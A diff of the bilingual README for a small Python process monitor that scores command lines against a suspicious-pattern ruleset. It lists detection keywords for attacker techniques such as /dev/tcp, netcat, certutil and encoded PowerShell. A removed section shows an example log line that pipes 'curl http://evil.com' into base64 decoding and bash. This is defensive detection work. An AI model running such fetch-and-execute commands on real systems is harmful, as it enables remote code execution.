@@ -4,428 +4,346 @@
 
 ![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)
 ![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS%20%7C%20Windows-informational?style=for-the-badge&logo=linux&logoColor=white&color=0078D4)
-![Version](https://img.shields.io/badge/Version-v1.0.0-brightgreen?style=for-the-badge)
+![Version](https://img.shields.io/badge/Version-v1.1.0-brightgreen?style=for-the-badge)
+![Tests](https://img.shields.io/badge/Tests-28%20passing-success?style=for-the-badge)
 ![License](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)
 
-Version: v1.0 (Initial Release)
+A small endpoint-telemetry tool: it watches for newly spawned processes, scores
+their command lines against a suspicious-pattern ruleset, and routes findings by
+severity. Roughly 600 lines of Python with one dependency (`psutil`).
 
-This is the first stable iteration of the monitor. It discovers newly spawned processes, applies lightweight pattern-based rules, writes structured logs, and prints high-severity alerts to the console. Future versions will expand capabilities while keeping noise low and performance reasonable.
-
-**Current behavior (v1.0):**
-- All detections → `logs/alerts.jsonl` (with severity and risk score)
-- `HIGH`/`CRITICAL` → printed to console with color
-- `LOW`/`MEDIUM` → logged silently
-- Process logging → **disabled by default** (enable with `--log-all`)
+It is a learning project, not a product — there is no kernel driver, no agent
+infrastructure, and no response capability. What it does implement end to end is
+the part that interested me: **turning noisy process telemetry into a small
+number of findings worth looking at.**
 
 ---
 
 ## Table of Contents
 
-- [Features](#features)
-- [Architecture Diagram](#architecture-diagram)
-- [Quick Demo](#quick-demo)
+- [How Detection Works](#how-detection-works)
+- [Cutting the False Positives](#cutting-the-false-positives)
+- [Architecture](#architecture)
 - [Setup](#setup)
-- [Run Monitor](#run-monitor)
-- [Review Tool](#review-tool-optional)
+- [Running the Monitor](#running-the-monitor)
+- [Review Tool](#review-tool)
 - [Example Output](#example-output)
 - [Risk Scores](#risk-scores)
 - [File Structure](#file-structure)
-- [Notes](#notes)
-- [Roadmap](#roadmap-planned-for-v1x)
-- [Testing / Generating Alerts](#testing--generating-alerts-safe-examples)
+- [Testing](#testing)
+- [Known Limitations](#known-limitations)
+- [Roadmap](#roadmap)
 - [🇹🇷 Türkçe Dokümantasyon](#-türkçe-dokümantasyon)
 
-## Features
+---
 
-- **Platform-aware detection**: Different suspicious patterns for Windows vs Unix/Linux/macOS
-- **Risk scoring system**: Each pattern has a risk score (20-100)
-- **Severity levels**: CRITICAL (≥100), HIGH (≥70), MEDIUM (≥40), LOW (<40)
-- **Smart categorization**:
-  - Score ≥70 → HIGH/CRITICAL (printed + logged)
-  - Score <70 → LOW/MEDIUM (logged silently)
-- **Interactive review tool**: CLI tool to review and classify suspicious activities
-- **Whitelist support**: Mark safe processes to reduce false positives
-- **Timezone-aware timestamps**: UTC ISO8601 with `Z` suffix
-- **Burst scanning**: Catch short-lived processes via `--burst`
+## How Detection Works
+
+Each new process contributes its `name`, `exe`, and `cmdline` to a match pass.
+Patterns come in two classes:
+
+| Class | Examples | Behaviour |
+| --- | --- | --- |
+| **Indicator** | `bash -c`, `powershell`, `base64 -d`, `/dev/tcp`, `curl` | Meaningful on its own. At least one must match or nothing is reported. |
+| **Modifier** | `\|`, `;`, `&&`, `\|\|`, `http://`, `https://`, `download` | Only contributes score once an indicator has matched. |
+
+Matched scores are summed and mapped to a severity:
+
+```
+CRITICAL >= 100    HIGH >= 70    MEDIUM >= 40    LOW < 40
+```
+
+Severity then decides where the finding goes:
+
+| Score | Severity | Destination |
+| --- | --- | --- |
+| >= 70 | HIGH / CRITICAL | `logs/alerts.jsonl` + printed to console in colour |
+| 40-69 | MEDIUM | `logs/review_queue.jsonl`, silent — triaged with `review_tool.py` |
+| < 40 | LOW | Dropped as noise (use `--log-all` to keep raw telemetry) |
+
+Two rules keep the arithmetic honest:
+
+- **Overlapping patterns score once.** `bash -c` contains `sh -c`, and
+  `-encodedcommand` contains `-enc`. A matched pattern that is a substring of
+  another matched pattern is discarded, so one technique is counted one time.
+- **Matching is word-bounded on alphanumeric edges.** `curl` fires on
+  `curl http://x` but not on `/usr/lib/libcurl.dylib`; `nc -` fires on netcat but
+  not on `sync -f`.
+
+## Cutting the False Positives
+
+The first version scored shell punctuation on its own. On a live macOS
+workstation that ruleset logged **147 detections, of which 144 (98%) were a
+single browser's renderer processes** — because a Chromium feature flag happens
+to contain a pipe character:
+
+```
+--origin-trial-disabled-features=CanvasTextNg|WebAssemblyCustomDescriptors
+```
+
+A `|` is not evidence of anything. It is a shell operator *when a shell is
+involved*, which is exactly what the indicator/modifier split encodes. Together
+with substring subsumption and word boundaries, every one of those 144 alerts
+now scores zero, while the genuine test cases score the same or higher.
+
+These cases are pinned in `tests/test_rules.py` so the noise cannot come back.
 
 ---
 
-## Architecture Diagram
+## Architecture
 
 ```
 ┌──────────────────────────────────────────────────────────────────┐
-│                         main.py                                  │
-│  Entry point — parses CLI args, starts the monitoring loop       │
-└──────────────────────┬───────────────────────────────────────────┘
-                       │ calls
-                       ▼
-┌──────────────────────────────────────────────────────────────────┐
-│                        monitor.py                                │
-│  Scans running processes via psutil, tracks seen PIDs,           │
-│  compares each new process against detection rules               │
-└────────┬──────────────────────────────────┬──────────────────────┘
-         │ imports rules                    │ calls logger
-         ▼                                  ▼
-┌─────────────────────┐        ┌────────────────────────────────────┐
-│      rules.py       │        │            logger.py               │
-│  Defines suspicious │        │  Writes structured JSONL entries   │
-│  keyword patterns   │        │  to disk                           │
-│  with risk scores   │        │                                    │
-└─────────────────────┘        └──────────────┬─────────────────────┘
-                                              │ writes
-                                              ▼
-                               ┌────────────────────────────────────┐
-                               │           logs/                    │
-                               │  ├── alerts.jsonl                  │
-                               │  ├── process_log.jsonl (--log-all) │
-                               │  ├── review_queue.jsonl            │
-                               │  └── whitelist.jsonl               │
-                               └──────────────┬─────────────────────┘
-                                              │ reads
-                                              ▼
-                               ┌────────────────────────────────────┐
-                               │         review_tool.py             │
-                               │  CLI tool to review, classify,     │
-                               │  and whitelist detections          │
-                               └────────────────────────────────────┘
+│                            main.py                               │
+│  Entry point. Parses CLI args, owns the polling loop, applies    │
+│  the whitelist, calls the rule engine, routes by severity,       │
+│  prints alerts.                                                  │
+└───────┬───────────────────┬──────────────────────┬───────────────┘
+        │ scan()            │ find_suspicious()    │ write_jsonl()
+        ▼                   ▼                      ▼
+┌────────────────┐  ┌──────────────────┐  ┌──────────────────────┐
+│   monitor.py   │  │     rules.py     │  │      logger.py       │
+│ Enumerates     │  │ Patterns, risk   │  │ Reads and writes     │
+│ processes via  │  │ scores, matching │  │ JSONL. The only      │
+│ psutil.        │  │ and severity.    │  │ module touching      │
+│ Collection     │  │ Pure logic, no   │  │ log files.           │
+│ only.          │  │ I/O.             │  │                      │
+└────────────────┘  └──────────────────┘  └──────────┬───────────┘
+                                                     │
+                                                     ▼
+                                        ┌────────────────────────┐
+                                        │         logs/          │
+                                        │  alerts.jsonl          │
+                                        │  review_queue.jsonl    │
+                                        │  whitelist.jsonl       │
+                                        │  process_log.jsonl     │
+                                        └───────────┬────────────┘
+                                                    │ reads / updates
+                                                    ▼
+                                        ┌────────────────────────┐
+                                        │     review_tool.py     │
+                                        │  Triage MEDIUM finds:  │
+                                        │  whitelist or promote  │
+                                        │  to a confirmed threat │
+                                        └────────────────────────┘
 ```
 
-**Data flow summary:**
-1. `main.py` starts the loop and passes config to `monitor.py`
-2. `monitor.py` loads patterns from `rules.py` and scans live processes
-3. Matches are sent to `logger.py`, which writes structured JSONL to `logs/`
-4. `review_tool.py` reads from `logs/` for manual triage workflows
-
----
-
-## Quick Demo
-
-**Quickest test method** (optional dev tool):
-```bash
-./dev/demo.sh
-```
-
-```
-# Expected output:
-========================================
-  Minimal EDR Monitor — Demo Menu
-========================================
-  1) Run simulation test (no psutil needed)
-  2) Run review tool demo
-  3) Start real monitor (30 seconds)
-  4) Show log statistics
-  q) Quit
-----------------------------------------
-Select an option:
-```
-
-Interactive menu with:
-- ✅ Simulation test (no psutil required)
-- 🔍 Review tool demo
-- 📊 Real system monitoring (30 seconds)
-- 📈 Statistics
+Collection (`monitor.py`), detection logic (`rules.py`), and persistence
+(`logger.py`) are kept apart; `main.py` is the only place that orchestrates
+them. The whitelist closes the loop: what you mark safe in `review_tool.py` is
+read back by the monitor on its next start.
 
 ---
 
 ## Setup
-```bash
-python3 -m pip install -r requirements.txt
-```
 
-```
-# Expected output:
-Collecting psutil>=5.9.0
-  Downloading psutil-5.9.8-cp311-cp311-macosx_10_9_x86_64.whl (248 kB)
-     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 248.3/248.3 kB 2.1 MB/s eta 0:00:00
-Successfully installed psutil-5.9.8
-```
-
-**or with virtualenv:**
 ```bash
 python3 -m venv .venv
-source .venv/bin/activate  # Windows: .venv\Scripts\activate
-pip install -r requirements.txt
+source .venv/bin/activate        # Windows: .venv\Scripts\activate
+pip install -r requirements.txt  # psutil
 ```
 
-```
-# Expected output:
-created virtual environment CPython3.11.0.final.0-64 in 1234ms
-  creator CPython3Posix(dest=.venv, clear=False, no_vcs_ignore=False, with_pip=True)
-Collecting psutil>=5.9.0
-  ...
-Successfully installed psutil-5.9.8
-```
+## Running the Monitor
 
----
-
-## Run Monitor
 ```bash
 python3 main.py
 ```
 
 ```
-# Expected output:
-Starting minimal EDR-like process monitor v1.0.0 on Darwin.
+Starting minimal EDR-like process monitor v1.1.0 on Darwin.
 Monitoring 20 suspicious patterns every 1.0s. Press Ctrl-C to stop.
 ```
 
-Run options:
-```bash
-# Base interval (seconds), default 1
-python3 main.py --interval 1
-```
+| Option | Default | Purpose |
+| --- | --- | --- |
+| `--interval N` | `1` | Seconds between scan cycles |
+| `--burst N` | `10` | Rapid scans per cycle, to catch short-lived processes |
+| `--burst-sleep N` | `0.05` | Seconds between burst scans |
+| `--log-all` | off | Also write every observed process to `process_log.jsonl` |
 
-```
-# Expected output:
-Starting minimal EDR-like process monitor v1.0.0 on Darwin.
-Monitoring 20 suspicious patterns every 1.0s. Press Ctrl-C to stop.
-```
+Polling means a process that lives for a few milliseconds can start and exit
+between two scans. `--burst` trades a little CPU for a much better chance of
+catching it:
 
 ```bash
-# Burst scanning N times per interval with sleep between bursts
 python3 main.py --burst 10 --burst-sleep 0.05
 ```
 
-```
-# Expected output:
-Starting minimal EDR-like process monitor v1.0.0 on Darwin.
-Monitoring 20 suspicious patterns every 1.0s. Press Ctrl-C to stop.
-```
+## Review Tool
+
+MEDIUM findings do not interrupt you — they queue up for triage:
 
 ```bash
-# Enable logging of all processes (default: off, only alerts are logged)
-python3 main.py --log-all
+python3 review_tool.py           # Walk pending records
+python3 review_tool.py --all     # Include already-reviewed records
+python3 review_tool.py --stats   # Summary counts
 ```
 
-```
-# Expected output:
-Starting minimal EDR-like process monitor v1.0.0 on Darwin.
-Monitoring 20 suspicious patterns every 1.0s. Press Ctrl-C to stop.
-```
-
----
-
-## Review Tool (Optional)
-
-*Note: v1.0 logs all detections to `alerts.jsonl` by default. The review tool is available for manual workflows.*
-
-```bash
-# Review pending records
-python3 review_tool.py
-```
-
-```
-# Expected output:
-===== EDR Review Tool =====
-Pending records: 3
-
-[1/3] 2026-03-16T10:22:05Z
-  PID: 4521 | Score: 75 | Severity: HIGH
-  Command: bash -c "sleep 2; echo 'curl http://example.com'"
-  Matches: ['curl(25)', 'bash -c(60)']
-Action? [b]enign / [s]uspicious / [w]hitelist / [skip]:
-```
-
-```bash
-# Show statistics
-python3 review_tool.py --stats
-```
-
-```
-# Expected output:
-===== EDR Statistics =====
-Total alerts logged : 12
-  CRITICAL          : 1
-  HIGH              : 4
-  MEDIUM            : 5
-  LOW               : 2
-Whitelisted entries : 3
-Pending review      : 2
-```
-
-```bash
-# Show all records
-python3 review_tool.py --all
-```
-
-```
-# Expected output:
-===== All Records =====
-[2026-03-16T10:20:01Z] CRITICAL | PID 1234 | Score 110 | bash -c curl http://evil.com | base64 -d | bash
-[2026-03-16T10:21:14Z] HIGH     | PID 4521 | Score  75 | bash -c "sleep 2; echo 'curl ...'"
-[2026-03-16T10:22:05Z] MEDIUM   | PID 6643 | Score  50 | python3 -c "import os; os.getcwd()"
-...
-```
+For each record you can mark it **Safe** (appends to `whitelist.jsonl`, so the
+monitor stops flagging it), **Threat** (promotes it to `alerts.jsonl`), or skip.
 
 ---
 
 ## Example Output
 
-### High Severity (printed to console)
+A detection at HIGH or above, printed to the console:
+
 ```
 🚨 [DETECTION - CRITICAL]
-   PID: 1234 | Score: 110
-   Matches: ['base64 -d(80)', 'bash -c(60)', 'curl(25)']
-   Command: bash -c curl http://evil.com | base64 -d | bash
+   PID: 31425 | Score: 135
+   Matches: ['bash -c(60)', 'http://(35)', 'curl(25)', ';(15)']
+   Command: bash -c sleep 2; echo 'curl http://example.com'
 ```
 
-### Low/Medium Severity (logged silently)
+The same finding in `logs/alerts.jsonl`:
+
+```json
+{
+  "pid": 31425,
+  "severity": "CRITICAL",
+  "risk_score": 135,
+  "matches": ["bash -c(60)", "http://(35)", "curl(25)", ";(15)"],
+  "event": {
+    "pid": 31425,
+    "name": "bash",
+    "exe": "/bin/bash",
+    "cmdline": "bash -c sleep 2; echo 'curl http://example.com'",
+    "create_time": 1773664906.2,
+    "username": "user",
+    "first_seen": "2026-03-16T18:41:46.919485Z",
+    "host": "workstation.local"
+  },
+  "timestamp": "2026-03-16T18:41:46.919485Z",
+  "status": "ALERT"
+}
 ```
-# Not printed to console; written to logs/alerts.jsonl only
-{"severity":"MEDIUM","risk_score":50,"matches":["curl(25)"],"pid":5678,...}
+
+### Generating alerts safely
+
+These commands only *echo* strings containing suspicious tokens — nothing is
+downloaded or executed. The `sleep` keeps the process alive long enough to be
+observed. Run them in a second terminal while the monitor is running.
+
+**Linux / macOS**
+
+```bash
+bash -c "sleep 2; echo 'curl http://example.com'"
+# CRITICAL, score 135 — bash -c(60), http://(35), curl(25), ;(15)
+
+bash -c "sleep 2; echo 'hello' | sed 's/hello/ok/'"
+# HIGH, score 90 — bash -c(60), |(15), ;(15)
+
+bash -c "sleep 2; echo 'python -c \"print(1)\"'"
+# CRITICAL, score 125 — bash -c(60), python -c(50), ;(15)
 ```
+
+**Windows (PowerShell)**
+
+```powershell
+powershell -Command "Start-Sleep -Seconds 2; Write-Output 'hello'"
+# HIGH, score 85 — powershell(70), ;(15)
+
+powershell -Command "Start-Sleep -Seconds 2; Write-Output '-EncodedCommand'"
+# CRITICAL, score 185 — -encodedcommand(100), powershell(70), ;(15)
+```
+
+Every score above is asserted in `tests/test_rules.py`.
 
 ---
 
 ## Risk Scores
 
-**High Risk (80-100)**
+**Indicators — high (80-100)**
 - Encoded commands (`-enc`, `-encodedcommand`)
 - Direct TCP connections (`/dev/tcp`)
 - Base64 decoding (`base64 -d`)
-- DLL execution (`rundll32`, `mshta`, `regsvr32`)
+- LOLBins (`rundll32`, `mshta`)
 
-**Medium Risk (50-79)**
-- Shell interpreters with inline commands (`bash -c`, `powershell`)
-- Network tools (`wget`, `curl`, `nc`)
-- Script interpreters with inline code (`python -c`, `perl -e`)
+**Indicators — medium (50-79)**
+- Shell interpreters with inline commands (`bash -c`, `powershell`, `pwsh`)
+- Netcat (`nc -`, `netcat`), `regsvr32`, `certutil`, `bitsadmin`
+- Script interpreters with inline code (`python -c`, `perl -e`, `ruby -e`)
 
-**Low Risk (20-49)**
-- Command chaining (`&&`, `||`, `|`)
-- URL patterns (`http://`, `https://`)
+**Indicators — low (20-49)**
+- Network fetch tools (`curl`, `wget`) — usually legitimate, so scored low
+
+**Modifiers (15-45)** — only count alongside an indicator
+- `download`, `http://`, `https://`, `&&`, `||`, `|`, `;`
+
+Windows and Unix indicator sets are selected automatically from
+`platform.system()`; modifiers apply everywhere.
 
 ---
 
 ## File Structure
 
 ```
+main.py            # Entry point, polling loop, severity routing
+monitor.py         # Process enumeration via psutil
+rules.py           # Patterns, risk scores, matching logic
+logger.py          # JSONL read/write
+review_tool.py     # Triage CLI for MEDIUM findings
+tests/             # unittest suite, no extra dependencies
 logs/
-├── process_log.jsonl       # All new processes (optional, requires --log-all)
-├── alerts.jsonl            # High threat (score ≥70)
-├── review_queue.jsonl      # Requires review (score 30-69) — optional workflow
-└── whitelist.jsonl         # Marked as safe (optional)
-
-JSONL schemas:
-- `process_log.jsonl`: `{timestamp, pid, name, exe, cmdline, create_time, username}` (only created with --log-all)
-- `alerts.jsonl`: `{timestamp, pid, name, cmdline, matches, risk_score, severity}`
+├── alerts.jsonl        # HIGH/CRITICAL (>= 70), append-only
+├── review_queue.jsonl  # MEDIUM (40-69), rewritten as items are triaged
+├── whitelist.jsonl     # Approved patterns, read by the monitor at startup
+└── process_log.jsonl   # Raw telemetry, only with --log-all
 ```
+
+`alerts.jsonl` and `review_queue.jsonl` share one schema:
+`{pid, severity, risk_score, matches, event, timestamp, status}`, where `event`
+is `{pid, name, exe, cmdline, create_time, username, first_seen, host}`.
+Timestamps are UTC ISO8601 with a trailing `Z`.
 
 ---
 
-## AGENTS.md
+## Testing
 
-This project includes an `AGENTS.md` file designed to be read by AI coding assistants (Claude, Copilot, Cursor, etc.) before making any changes to the codebase.
+```bash
+python3 -m unittest discover -s tests -v
+```
 
-It covers:
-- Architecture and file roles
-- Critical rules and boundaries (what must not be changed)
-- Coding style and conventions
-- Known intentional limitations
-- Safe test commands with expected scores
-
-If you are an AI assistant working on this project, read `AGENTS.md` first.
+28 tests, no dependencies beyond the standard library. `test_monitor.py` runs
+against a stub `psutil`, so the suite touches no real processes. The suite
+asserts the exact scores published in this README — if a rule changes and the
+docs are not updated, the tests fail.
 
 ---
 
-## Notes
-- Only NEW PIDs are logged (tracker kept in-memory).
-- Handles `psutil.NoSuchProcess` and `psutil.AccessDenied` gracefully.
-- Suspicious keywords are defined in `rules.py`.
-- Platform detection is automatic via `platform.system()`.
-- Review decisions are persistent and can be audited.
-- Short, common enumeration commands (e.g., `whoami`, `uname -a`, `id`) are intentionally not flagged to reduce noise; extremely short-lived processes may be missed unless burst scanning is enabled or commands are delayed (e.g., `bash -c 'sleep 2; whoami'`).
-- Only `HIGH`/`CRITICAL` alerts print to console; `LOW`/`MEDIUM` are written to `alerts.jsonl`.
-- Dev/demo helpers are archived under `dev/`. You may remove them entirely.
+## Known Limitations
+
+- **Detection is command-line pattern matching only.** No parent/child lineage,
+  no file or network telemetry. A malicious binary with an innocuous command
+  line is invisible to it.
+- **Process tracking is in memory.** The seen set does not survive a restart. It
+  is keyed by `(pid, create_time)` so recycled PIDs are correctly treated as new
+  processes, and it is pruned every scan so it stays bounded.
+- **Polling can miss very short-lived processes**, even with `--burst`.
+- **LOW findings are not persisted.** Use `--log-all` if you want everything.
+- `whoami`, `uname -a`, and `id` are deliberately not flagged.
+- The whitelist is loaded at startup; entries added mid-run apply after a
+  restart.
 
 ---
 
-## Roadmap (Planned for v1.x+)
+## Roadmap
 
-- **Parent/child process lineage**: Track process ancestry and spawning chains.
-- **Persistent baselines**: Save seen PIDs and whitelists across restarts.
-- **Extended detection rules**: File writes to sensitive paths, outbound network connections, privilege escalation.
-- **Configuration file support**: YAML/JSON config for rules, thresholds, log paths.
-- **Packaging**: Install via `pipx` or standalone binary; systemd/launchd service templates.
-- **Integrations**: Webhook alerts, syslog forwarding, SIEM-friendly JSON output.
+- **Parent/child process lineage** — track ancestry and spawn chains
+- **Persistent baselines** — carry seen processes and whitelists across restarts
+- **Extended telemetry** — file writes to sensitive paths, outbound connections
+- **Configuration file** — YAML/JSON for rules, thresholds, and log paths
+- **Packaging** — `pipx` install, systemd/launchd service templates
+- **Integrations** — webhook alerts, syslog forwarding
+
+See [CONTRIBUTING.md](CONTRIBUTING.md) for architecture notes and the rules that
+govern changes to the detection engine.
+
+## License
+
+MIT — see [LICENSE](LICENSE).
 
 ---
-
-## Testing / Generating Alerts (Safe examples)
-
-Below are safe, non-harmful example commands you can run locally to generate alert entries while the monitor is running. These commands *do not* download or execute untrusted code — they only include suspicious keywords (echoed) so the monitor's pattern-matching triggers.
-
-Linux / macOS (bash/zsh):
-```zsh
-# Produces a process whose cmdline contains 'curl' (no network call)
-bash -c "sleep 2; echo 'curl http://example.com'"
-```
-
-```
-# Expected output (in monitor console):
-🚨 [DETECTION - CRITICAL]
-   PID: 8821 | Score: 135
-   Matches: ['bash -c(60)', 'http://(35)', 'curl(25)', ';(15)']
-   Command: bash -c "sleep 2; echo 'curl http://example.com'"
-```
-
-```zsh
-# Includes a 'base64' token and a pipe '|' in the command string
-bash -c "sleep 2; echo 'hello' | sed 's/hello/ok/'"
-```
-
-```
-# Expected output (in monitor console):
-🚨 [DETECTION - HIGH]
-   PID: 8834 | Score: 75
-   Matches: ['bash -c(60)', '|(15)']
-   Command: bash -c "sleep 2; echo 'hello' | sed 's/hello/ok/'"
-```
-
-```zsh
-# Shows an inline interpreter token (python -c) but only echoes the string
-bash -c "sleep 2; echo 'python -c \"print(1)\"'"
-```
-
-```
-# Expected output (in monitor console):
-🚨 [DETECTION - CRITICAL]
-   PID: 8847 | Score: 125
-   Matches: ['bash -c(60)', 'python -c(50)', ';(15)']
-   Command: bash -c "sleep 2; echo 'python -c \"print(1)\"'"
-```
-
-Windows (PowerShell) — run from an Administrator/regular PowerShell prompt:
-```powershell
-# Safe: prints an Invoke-Expression-like token, does not execute it
-powershell -Command "Start-Sleep -Seconds 2; Write-Output 'Invoke-Expression'"
-```
-
-```
-# Expected output (in monitor console):
-🚨 [DETECTION - HIGH]
-   PID: 3310 | Score: 70
-   Matches: ['powershell(70)']
-   Command: powershell -Command "Start-Sleep -Seconds 2; Write-Output 'Invoke-Expression'"
-```
-
-```powershell
-# Safe encoded-like token (no execution)
-powershell -Command "Start-Sleep -Seconds 2; Write-Output 'EncodedCommand'"
-```
-
-```
-# Expected output (in monitor console):
-🚨 [DETECTION - CRITICAL]
-   PID: 3325 | Score: 170
-   Matches: ['-encodedcommand(100)', 'powershell(70)']
-   Command: powershell -Command "Start-Sleep -Seconds 2; Write-Output 'EncodedCommand'"
-```
-
-Notes:
-- These examples use `sleep`/`Start-Sleep` so the process exists long enough to be observed. Without a delay the monitor may miss very short-lived commands.
-- For higher detection reliability, run the monitor with `--burst N --burst-sleep 0.05` (e.g., `--burst 10`).
-- The strings shown (e.g., `curl`, `base64`, `python -c`) are matched by `rules.py` and will produce entries in `logs/alerts.jsonl` with an associated `risk_score` and `severity`.
-
 ---
 
 # 🇹🇷 Türkçe Dokümantasyon
@@ -436,165 +354,142 @@ Notes:
 
 ![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)
 ![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS%20%7C%20Windows-informational?style=for-the-badge&logo=linux&logoColor=white&color=0078D4)
-![Version](https://img.shields.io/badge/Sürüm-v1.0.0-brightgreen?style=for-the-badge)
+![Version](https://img.shields.io/badge/Sürüm-v1.1.0-brightgreen?style=for-the-badge)
+![Tests](https://img.shields.io/badge/Test-28%20ge%C3%A7iyor-success?style=for-the-badge)
 ![License](https://img.shields.io/badge/Lisans-MIT-yellow?style=for-the-badge)
 
-Sürüm: v1.0 (İlk Kararlı Sürüm)
+Küçük bir uç nokta telemetri aracı: yeni başlayan süreçleri izler, komut
+satırlarını şüpheli örüntü kural setine karşı puanlar ve bulguları önem düzeyine
+göre yönlendirir. Tek bağımlılıkla (`psutil`) yaklaşık 600 satır Python.
 
-Bu, izleyicinin ilk kararlı iterasyonudur. Yeni başlayan süreçleri keşfeder, hafif örüntü tabanlı kurallar uygular, yapılandırılmış günlükler yazar ve yüksek öncelikli uyarıları konsola yazdırır. Gelecekteki sürümler, gürültüyü düşük ve performansı makul tutarken yetenekleri genişletecektir.
-
-**v1.0'ın mevcut davranışı:**
-- Tüm tespitler → `logs/alerts.jsonl` (önem düzeyi ve risk puanıyla birlikte)
-- `HIGH`/`CRITICAL` → konsolda renkli olarak gösterilir
-- `LOW`/`MEDIUM` → sessizce günlüğe kaydedilir
-- Süreç günlüğü → **varsayılan olarak devre dışı** (`--log-all` ile etkinleştirin)
+Bu bir öğrenme projesi, ürün değil — kernel sürücüsü, ajan altyapısı veya
+müdahale yeteneği yok. Uçtan uca uyguladığı şey beni asıl ilgilendiren kısım:
+**gürültülü süreç telemetrisini, bakmaya değer az sayıda bulguya dönüştürmek.**
 
 ---
 
 ## İçindekiler (TR)
 
-- [Özellikler](#özellikler)
-- [Mimari Diyagram](#mimari-diyagram)
-- [Hızlı Demo](#hızlı-demo)
+- [Tespit Nasıl Çalışıyor](#tespit-nasıl-çalışıyor)
+- [False Positive'leri Kesmek](#false-positiveleri-kesmek)
+- [Mimari](#mimari)
 - [Kurulum](#kurulum)
 - [İzleyiciyi Çalıştırma](#i̇zleyiciyi-çalıştırma)
-- [İnceleme Aracı](#i̇nceleme-aracı-isteğe-bağlı)
+- [İnceleme Aracı](#i̇nceleme-aracı)
 - [Örnek Çıktı](#örnek-çıktı)
 - [Risk Puanları](#risk-puanları)
 - [Dosya Yapısı](#dosya-yapısı)
-- [Notlar](#notlar)
-- [Yol Haritası](#yol-haritası-v1x-için-planlandı)
-- [Test / Uyarı Oluşturma](#test--uyarı-oluşturma-güvenli-örnekler)
+- [Testler](#testler)
+- [Bilinen Sınırlamalar](#bilinen-sınırlamalar)
+- [Yol Haritası](#yol-haritası)
 
 ---
 
-## Özellikler
+## Tespit Nasıl Çalışıyor
 
-- **Platforma özgü tespit**: Windows ve Unix/Linux/macOS için farklı şüpheli örüntüler
-- **Risk puanlama sistemi**: Her örüntünün bir risk puanı vardır (20-100 arası)
-- **Önem düzeyleri**: CRITICAL (≥100), HIGH (≥70), MEDIUM (≥40), LOW (<40)
-- **Akıllı sınıflandırma**:
-  - Puan ≥70 → HIGH/CRITICAL (konsola yazdırılır + günlüğe kaydedilir)
-  - Puan <70 → LOW/MEDIUM (sessizce günlüğe kaydedilir)
-- **Etkileşimli inceleme aracı**: Şüpheli etkinlikleri incelemek ve sınıflandırmak için CLI aracı
-- **Beyaz liste desteği**: Yanlış pozitifleri azaltmak için güvenli süreçleri işaretleyin
-- **Saat dilimi uyumlu zaman damgaları**: `Z` sonekiyle UTC ISO8601
-- **Burst taraması**: `--burst` ile kısa ömürlü süreçleri yakalayın
+Her yeni süreç `name`, `exe` ve `cmdline` alanlarıyla eşleştirmeye girer.
+Örüntüler iki sınıfa ayrılır:
+
+| Sınıf | Örnekler | Davranış |
+| --- | --- | --- |
+| **Gösterge (Indicator)** | `bash -c`, `powershell`, `base64 -d`, `/dev/tcp`, `curl` | Tek başına anlamlı. En az biri eşleşmezse hiçbir şey raporlanmaz. |
+| **Değiştirici (Modifier)** | `\|`, `;`, `&&`, `\|\|`, `http://`, `https://`, `download` | Yalnızca bir gösterge eşleştikten sonra puana katkı yapar. |
+
+Eşleşen puanlar toplanır ve bir önem düzeyine eşlenir:
+
+```
+CRITICAL >= 100    HIGH >= 70    MEDIUM >= 40    LOW < 40
+```
+
+Önem düzeyi bulgunun nereye gideceğini belirler:
+
+| Puan | Önem | Hedef |
+| --- | --- | --- |
+| >= 70 | HIGH / CRITICAL | `logs/alerts.jsonl` + konsola renkli yazdırılır |
+| 40-69 | MEDIUM | `logs/review_queue.jsonl`, sessiz — `review_tool.py` ile incelenir |
+| < 40 | LOW | Gürültü olarak elenir (`--log-all` ile ham telemetri saklanır) |
+
+İki kural aritmetiği dürüst tutar:
+
+- **Örtüşen örüntüler bir kez sayılır.** `bash -c` içinde `sh -c`,
+  `-encodedcommand` içinde `-enc` geçer. Başka bir eşleşmenin alt dizesi olan
+  örüntü elenir; böylece tek bir teknik tek kez puanlanır.
+- **Eşleşme alfanümerik kenarlarda kelime sınırlıdır.** `curl`,
+  `curl http://x` üzerinde tetiklenir ama `/usr/lib/libcurl.dylib` üzerinde
+  tetiklenmez; `nc -` netcat'te tetiklenir ama `sync -f` üzerinde tetiklenmez.
+
+## False Positive'leri Kesmek
+
+İlk sürüm shell noktalama işaretlerini tek başına puanlıyordu. Canlı bir macOS
+iş istasyonunda bu kural seti **147 tespit kaydetti; bunların 144'ü (%98) tek
+bir tarayıcının renderer süreçleriydi** — çünkü bir Chromium feature flag'i
+içinde boru karakteri geçiyor:
+
+```
+--origin-trial-disabled-features=CanvasTextNg|WebAssemblyCustomDescriptors
+```
+
+Bir `|` hiçbir şeyin kanıtı değildir. *Bir shell işin içindeyse* bir shell
+operatörüdür — gösterge/değiştirici ayrımının kodladığı şey tam olarak bu. Alt
+dize eleme ve kelime sınırlarıyla birlikte, o 144 uyarının tamamı artık sıfır
+puan alıyor; gerçek test vakaları ise aynı veya daha yüksek puanda kalıyor.
+
+Bu vakalar `tests/test_rules.py` içinde sabitlendi, gürültü geri gelemez.
 
 ---
 
-## Mimari Diyagram
+## Mimari
 
 ```
 ┌──────────────────────────────────────────────────────────────────┐
-│                         main.py                                  │
-│  Giriş noktası — CLI argümanlarını ayrıştırır, izleme döngüsünü  │
-│  başlatır                                                        │
-└──────────────────────┬───────────────────────────────────────────┘
-                       │ çağırır
-                       ▼
-┌──────────────────────────────────────────────────────────────────┐
-│                        monitor.py                                │
-│  psutil ile çalışan süreçleri tarar, görülen PID'leri takip     │
-│  eder, her yeni süreci tespit kurallarıyla karşılaştırır         │
-└────────┬──────────────────────────────────┬──────────────────────┘
-         │ kuralları içe aktarır            │ logger'ı çağırır
-         ▼                                  ▼
-┌─────────────────────┐        ┌────────────────────────────────────┐
-│      rules.py       │        │            logger.py               │
-│  Risk puanlarıyla   │        │  Yapılandırılmış JSONL girdilerini │
-│  şüpheli anahtar    │        │  diske yazar                       │
-│  kelime örüntülerini│        │                                    │
-│  tanımlar           │        │                                    │
